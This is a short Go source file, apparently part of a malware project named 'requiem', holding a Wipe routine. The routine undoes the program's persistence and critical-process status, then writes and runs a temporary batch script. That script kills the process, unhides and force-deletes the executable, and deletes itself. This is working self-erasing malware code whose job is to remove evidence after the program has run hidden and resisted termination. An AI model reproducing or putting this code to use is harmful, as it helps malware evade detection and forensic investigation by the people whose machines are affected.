package funcs

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"

	"requiem/persistence"
	"requiem/store"
	"requiem/utils"
)

func Wipe() {
	persistence.Unpersist()

	utils.RemoveMutex()

	SetCritical(false)

	var wipe strings.Builder
	wipe.WriteString("@echo off\n")
	wipe.WriteString("timeout /t 2 /nobreak > nul\n")
	fmt.Fprintf(&wipe, "taskkill /f /pid %d\n", os.Getpid())
	wipe.WriteString("timeout /t 1 /nobreak > nul\n")
	fmt.Fprintf(&wipe, "attrib -h -s \"%s\"\n", store.ExecPath)
	fmt.Fprintf(&wipe, "del /f /q \"%s\"\n", store.ExecPath)
	wipe.WriteString("del /f /q \"%~f0\"\n")

	name := fmt.Sprintf("%d.bat", time.Now().UnixNano())
	path := filepath.Join(os.TempDir(), name)

	err := os.WriteFile(path, []byte(wipe.String()), 0666)
	if err != nil {
		return
	}

	cmd := utils.StartCommand("cmd", "/c", path)
	cmd.Start()

	os.Exit(0)
}
